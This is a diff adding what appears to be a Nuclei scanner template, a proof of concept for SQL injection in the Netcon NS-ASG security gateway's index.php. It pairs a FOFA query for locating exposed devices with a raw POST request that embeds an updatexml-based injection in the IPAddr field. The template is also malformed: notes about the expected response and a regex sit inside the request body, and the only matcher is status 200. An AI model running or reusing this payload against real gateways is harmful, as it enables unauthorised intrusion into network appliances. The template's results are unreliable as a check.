@@ -1,0 +1,60 @@
+id: poc-wbscmhrvxubk8ze5
+info:
+  name: 网康NS-ASG应用安全网关index.php sql注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wbscmhrvxubk8ze5'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: wbscmhrvxubk8ze5
+    fofa: app="网康科技-NS-ASG安全网关"
+http:
+- raw:
+  - 'POST /protocol/index.php HTTP/1.1
+
+
+    Cookie: PHPSESSID=bfd2e9f9df564de5860117a93ecd82de
+
+
+    Accept: */*
+
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Te: trailers
+
+
+    Connection: close
+
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+
+
+    jsoncontent={"protocolType":"addmacbind","messagecontent":["{\"BandIPMacId\":\"1\",\"IPAddr\":\"eth0''and(updatexml(1,concat(0x7e,(select+version())),1))=''\",\"MacAddr\":\"\",\"DestIP\":\"\",\"DestMask\":\"255.255.255.0\",\"Description\":\"Sample+Description\"}"]}
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    ^(?=.*?syntax)(?=.*?error).*?$
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
